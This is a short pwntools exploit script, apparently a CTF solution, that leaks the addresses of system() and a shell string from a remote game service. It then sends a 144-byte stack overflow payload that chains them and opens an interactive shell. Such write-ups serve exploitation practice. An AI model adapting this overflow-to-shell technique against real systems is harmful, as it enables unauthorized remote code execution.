from pwn import *

p = remote("ctf.j0n9hyun.xyz", 3010)

for i in range(8):
	p.recvuntil(">>> ")
	p.sendline("2")
	p.recvuntil("(Job)>>> ")
	p.sendline("3")

p.recvuntil(">>> ")
p.sendline("3")
p.recvuntil("System Armor : ")
systemAdd =p32(int(p.recv(10),16))
p.recvuntil(">>> ")
p.sendline("4")
p.recvuntil("Shell Sword : ")
shellAdd = p32(int(p.recv(10),16))

payload = 'R'*144
payload += systemAdd
payload += 'T'*4
payload += shellAdd

p.recvuntil(">>> ")
p.sendline("5")
p.recvuntil("[Attack] > ")
p.sendline(payload)
p.interactive()
